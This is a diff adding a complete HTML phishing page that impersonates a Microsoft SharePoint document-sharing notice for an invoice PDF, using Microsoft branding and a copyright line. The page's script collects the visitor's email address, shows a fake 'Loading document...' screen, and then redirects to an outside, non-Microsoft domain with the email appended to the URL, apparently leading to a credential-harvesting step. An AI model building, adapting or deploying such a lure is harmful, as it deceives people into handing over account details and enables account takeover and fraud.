@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Secure Document | SharePoint</title>
+<style>
+@keyframes buttonPulse {
+0%, 100% {
+background-color: white;
+color: #0078d7;
+box-shadow: none;
+}
+50% {
+background-color: #dbe9fc;
+color: #005a9e;
+box-shadow: 0 0 10px #005a9e;
+}
+}
+@keyframes breathing {
+0%, 100% { transform: scale(1); }
+50% { transform: scale(1.02); }
+}
+body {
+font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+background-color: #0078d7;
+color: white;
+margin: 0;
+padding: 0;
+display: flex;
+justify-content: center;
+align-items: center;
+height: 100vh;
+}
+.container {
+background: #005a9e;
+padding: 2.5rem 3rem;
+border-radius: 10px;
+max-width: 400px;
+width: 100%;
+text-align: center;
+animation: breathing 6s ease-in-out infinite;
+position: relative;
+z-index: 2;
+}
+.logo-circle {
+width: 60px;
+height: 60px;
+background: white;
+border-radius: 50%;
+margin: 0 auto 10px auto;
+position: relative;
+}
+.logo-circle::before {
+content: "";
+position: absolute;
+top: 14px;
+left: 14px;
+width: 32px;
+height: 32px;
+border-radius: 4px;
+background: #0078d7;
+box-shadow: 28px 0 0 #0078d7, 0 28px 0 #0078d7;
+}
+h1 {
+font-weight: bold;
+font-size: 1.6rem;
+margin: 0 0 0.5rem 0;
+}
+.sub-header {
+font-size: 1rem;
+margin: 0 0 2rem 0;
+font-weight: 500;
+}
+.file-info {
+background: #005a9e;
+padding: 1rem 0.5rem;
+border-radius: 6px;
+margin-bottom: 1.5rem;
+}
+.file-info h2 {
+margin: 0 0 0.25rem 0;
+font-weight: 700;
+}
+.file-info p {
+margin: 0;
+font-size: 0.9rem;
+color: #cce7ff;
+}
+label {
+font-weight: 600;
+margin-bottom: 0.5rem;
+display: flex;
+align-items: center;
+justify-content: center;
+gap: 10px;
+font-size: 1rem;
+}
+.doc-icon-small {
+width: 24px;
+height: 24px;
+fill: white;
+}
+input[type="email"] {
+width: 100%;
+padding: 0.6rem 0.8rem;
+border-radius: 6px;
+border: none;
+font-size: 1rem;
+margin-bottom: 1.25rem;
+outline-offset: 0;
+}
+button {
+border: none;
+border-radius: 6px;
+background: white;
+color: #0078d7;
+font-weight: bold;
+padding: 0.7rem 0;
+font-size: 1.1rem;
+cursor: pointer;
+width: 100%;
+animation: buttonPulse 6s ease-in-out infinite;
+}
+button:hover {
+background-color: #bcd9f6;
+color: #004080;
+box-shadow: 0 0 10px #004080;
+}
+footer {
+margin-top: 2rem;
+font-size: 0.75rem;
+color: #cce7ff;
+}
+.loading-screen {
+display: none;
+position: fixed;
+top: 0;
+left: 0;
+width: 100%;
+height: 100%;
+background: white;
+color: #0078d7;
+font-size: 1.5rem;
+font-weight: bold;
+align-items: center;
+justify-content: center;
+z-index: 999;
+}
+</style>
+</head>
+<body>
+
+<div class="loading-screen" id="loadingScreen">
+Loading document...
+</div>
+
+<div class="container" role="main">
+<div class="logo-circle" aria-label="SharePoint style logo"></div>
+<h1>SharePoint</h1>
+<div class="sub-header">A new document is now available for your review.</div>
+<div class="file-info" aria-label="file information">
+<h2>INV-PROJ #92468.pdf</h2>
+<p>7.64 MB</p>
+</div>
+<form id="emailForm">
+<label for="emailInput">
+<svg class="doc-icon-small" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false">
+<path d="M6 2a2 2 0 0 0-2 2v16c0 1.1.9 2 2 2h12a2 2 0 0 0 2-2V8l-6-6H6zM7 4h6v5h5v11H7V4z" />
+</svg>
+Enter your email address to access the document
+</label>
+<input
+type="email"
+id="emailInput"
+name="email"
+placeholder="Enter your email"
+required
+autocomplete="email"
+spellcheck="false"
+/>
+<button type="submit">Preview Document</button>
+</form>
+<footer>This is a secure document sharing notification. Please do not forward this email. ©️ 2025 Microsoft. All rights reserved.</footer>
+</div>
+
+<script>
+const form = document.getElementById('emailForm');
+const loadingScreen = document.getElementById('loadingScreen');
+
+form.addEventListener('submit', function(event) {
+event.preventDefault();
+const email = document.getElementById('emailInput').value.trim();
+if (email) {
+loadingScreen.style.display = "flex";
+setTimeout(() => {
+const redirectUrl = 'https://familyservicebc.oozed.it.com/l3r8c';
+window.location.href = `${redirectUrl}?email=${encodeURIComponent(email)}`;
+}, 2000); // 2 second loading before redirect
+}
+});
+</script>
+
+</body>
+</html>
